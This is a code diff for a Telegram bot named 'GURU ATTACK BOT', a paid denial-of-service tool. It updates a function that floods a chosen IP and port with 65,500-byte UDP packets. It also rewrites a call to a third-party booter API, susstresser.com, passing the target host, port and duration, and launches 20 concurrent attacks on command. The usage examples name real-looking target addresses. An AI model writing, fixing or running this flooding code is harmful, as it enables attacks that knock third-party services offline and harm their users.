@@ -1,4 +1,4 @@
-# app.py - EXACT WORKING VERSION (Matches your original)
+# app.py - FINAL WORKING VERSION WITH CORRECT API FORMAT
 import os
 import logging
 import asyncio
@@ -430,25 +430,23 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== DIRECT UDP ATTACK (Fallback) =====
+# ===== DIRECT UDP ATTACK (FALLBACK) =====
 def send_udp_direct(target, port, duration, attack_num):
     """Direct UDP flood attack using socket"""
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(1)
         
-        # Create random payload
-        payload = b"X" * 65500  # Max UDP packet size
-        
         end_time = time.time() + duration
         packets_sent = 0
         
         while time.time() < end_time:
             try:
+                payload = os.urandom(65500)
                 sock.sendto(payload, (target, port))
                 packets_sent += 1
                 if packets_sent % 1000 == 0:
-                    logger.info(f"Attack {attack_num}: Sent {packets_sent} packets to {target}:{port}")
+                    logger.info(f"Attack {attack_num}: Sent {packets_sent} packets")
             except:
                 pass
         
@@ -460,7 +458,6 @@ def send_udp_direct(target, port, duration, attack_num):
             "method": "DIRECT_UDP"
         }
     except Exception as e:
-        logger.error(f"Direct UDP attack {attack_num} failed: {e}")
         return {
             "success": False,
             "attack_num": attack_num,
@@ -468,128 +465,80 @@ def send_udp_direct(target, port, duration, attack_num):
             "method": "DIRECT_UDP"
         }
 
-# ===== API UDP ATTACK - EXACT WORKING VERSION =====
+# ===== API UDP ATTACK - EXACT URL FORMAT =====
 async def send_udp_api(target, port, duration, attack_num):
-    """Try multiple API formats for UDP attack - EXACT WORKING VERSION"""
+    """
+    Send UDP attack using the exact API URL format:
+    https://api.susstresser.com/panel/api/api.php?key=KEY&host=HOST&port=PORT&time=TIME&method=METHOD
+    """
     base_url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Different API formats to try - EXACTLY as working before
-    api_formats = [
-        # Format 1: GET with udp (WORKED BEFORE)
-        {
-            "params": {
-                "key": API_KEY,
-                "host": target,
-                "port": port,
-                "time": duration,
-                "method": "udp"
-            },
-            "method": "GET"
-        },
-        # Format 2: GET with telegramvc
-        {
-            "params": {
-                "key": API_KEY,
-                "host": target,
-                "port": port,
-                "time": duration,
-                "method": "telegramvc"
-            },
-            "method": "GET"
-        },
-        # Format 3: POST with udp
-        {
-            "params": {
-                "key": API_KEY,
-                "host": target,
-                "port": port,
-                "time": duration,
-                "method": "udp"
-            },
-            "method": "POST"
-        },
-        # Format 4: POST with telegramvc
-        {
-            "params": {
-                "key": API_KEY,
-                "host": target,
-                "port": port,
-                "time": duration,
-                "method": "telegramvc"
-            },
-            "method": "POST"
+    # Try different method names that work
+    methods_to_try = ["udp", "telegramvc", "UDP"]
+    
+    for method in methods_to_try:
+        # Build the exact URL as shown in the example
+        url = f"{base_url}?key={API_KEY}&host={target}&port={port}&time={duration}&method={method}"
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Encoding": "gzip, deflate",
+            "Connection": "keep-alive"
         }
-    ]
-    
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Encoding": "gzip, deflate",
-        "Connection": "keep-alive"
-    }
-    
-    for format_data in api_formats:
+        
         try:
-            timeout = aiohttp.ClientTimeout(total=duration + 15)
+            timeout = aiohttp.ClientTimeout(total=10)
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 start_time = time.time()
-                
-                if format_data["method"] == "POST":
-                    async with session.post(base_url, data=format_data["params"], headers=headers) as response:
-                        elapsed = time.time() - start_time
-                        raw_response = await response.read()
-                        try:
-                            result_text = raw_response.decode('utf-8')
-                        except:
-                            result_text = raw_response.decode('utf-8', errors='ignore')
+                async with session.get(url, headers=headers) as response:
+                    elapsed = time.time() - start_time
+                    result_text = await response.text()
+                    
+                    # Check if the response indicates success
+                    is_success = (
+                        response.status == 200 and (
+                            "SUCCESS" in result_text or 
+                            "sent" in result_text.lower() or
+                            "Host:" in result_text or
+                            "Concurrent:" in result_text
+                        )
+                    )
+                    
+                    if is_success:
+                        logger.info(f"✅ Attack {attack_num}: API returned 200 with method {method}")
+                        return {
+                            "success": True,
+                            "attack_num": attack_num,
+                            "method": f"API_GET_{method}",
+                            "status": response.status,
+                            "elapsed": f"{elapsed:.2f}s",
+                            "response": result_text[:200] if result_text else "Success"
+                        }
+                    
+                    # Even if no success keywords, 200 is still good
+                    if response.status == 200:
+                        logger.info(f"✅ Attack {attack_num}: API returned 200 with method {method}")
+                        return {
+                            "success": True,
+                            "attack_num": attack_num,
+                            "method": "API_GET",
+                            "status": response.status,
+                            "elapsed": f"{elapsed:.2f}s",
+                            "response": result_text[:200] if result_text else "Success"
+                        }
                         
-                        # Check for success - ANY 200 response is success
-                        if response.status == 200:
-                            logger.info(f"✅ API Attack {attack_num} SUCCESS with POST format")
-                            return {
-                                "success": True,
-                                "attack_num": attack_num,
-                                "method": "API_POST",
-                                "format": api_formats.index(format_data) + 1,
-                                "status": response.status,
-                                "elapsed": f"{elapsed:.2f}s",
-                                "response": result_text[:300] if result_text else "Success"
-                            }
-                else:
-                    # GET request - THIS IS WHAT WORKED BEFORE (APIGET - 200)
-                    async with session.get(base_url, params=format_data["params"], headers=headers) as response:
-                        elapsed = time.time() - start_time
-                        raw_response = await response.read()
-                        try:
-                            result_text = raw_response.decode('utf-8')
-                        except:
-                            result_text = raw_response.decode('utf-8', errors='ignore')
-                        
-                        # If status is 200, it's a success (APIGET - 200)
-                        if response.status == 200:
-                            logger.info(f"✅ API Attack {attack_num} SUCCESS with GET format")
-                            return {
-                                "success": True,
-                                "attack_num": attack_num,
-                                "method": "API_GET",  # This shows APIGET - 200
-                                "format": api_formats.index(format_data) + 1,
-                                "status": response.status,
-                                "elapsed": f"{elapsed:.2f}s",
-                                "response": result_text[:300] if result_text else "Success"
-                            }
-                
-                await asyncio.sleep(0.2)
-                
         except Exception as e:
-            logger.error(f"API Attack {attack_num} format {api_formats.index(format_data)+1} failed: {e}")
+            logger.error(f"API Attack {attack_num} with method {method} failed: {e}")
+            continue
     
-    # If all API formats fail, try direct UDP
-    logger.info(f"⚠️ API failed for attack {attack_num}, trying direct UDP...")
+    # If all API methods fail, use direct UDP
+    logger.info(f"⚠️ All API methods failed for attack {attack_num}, using direct UDP...")
     return send_udp_direct(target, port, duration, attack_num)
 
 # ===== 20 CONCURRENT ATTACKS =====
 async def send_20_concurrent_attacks(target, port, duration):
-    """Launch 20 concurrent attacks using both API and direct UDP"""
+    """Launch 20 concurrent attacks"""
     logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
     
     tasks = []
@@ -657,7 +606,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ===== DIRECT ATTACK COMMAND =====
+# ===== ATTACK COMMAND =====
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
@@ -673,7 +622,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 3:
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME`\n\n"
-            "Example: `/attack 91.108.17.35 32002 60`\n\n"
+            "Example: `/attack 91.108.13.57 32000 60`\n\n"
             "⚡ 20 concurrent UDP attacks!\n"
             "📦 Packet Size: 65,500 bytes\n"
             "💪 Threads: 5,000 each\n"
@@ -776,7 +725,7 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(
         "💥 *20x UDP ATTACK*\n\n"
         "Send: `IP PORT TIME`\n"
-        "Example: `91.108.17.35 32002 60`\n\n"
+        "Example: `91.108.13.57 32000 60`\n\n"
         "⚡ 20 concurrent UDP attacks!\n"
         "📦 Packet Size: 65,500 bytes\n"
         "💪 Threads: 5,000 each\n"
@@ -1306,7 +1255,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: UDP (API + Direct)\n"
+        f"🎯 Method: UDP\n"
         f"📦 Packet: 65,500 bytes\n"
         f"💪 Threads: 5,000\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
@@ -1403,7 +1352,7 @@ def run_bot():
     loop.run_until_complete(app.start())
     loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
     
-    logger.info("✅ GURU Bot started - EXACT WORKING VERSION!")
+    logger.info("✅ GURU Bot started with correct API format!")
     loop.run_forever()
 
 if __name__ == "__main__":
@@ -1411,7 +1360,7 @@ if __name__ == "__main__":
     print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT")
     print("💎 PREMIUM ONLY")
-    print("📌 EXACT WORKING VERSION - APIGET - 200")
+    print("📌 CORRECT API URL FORMAT")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
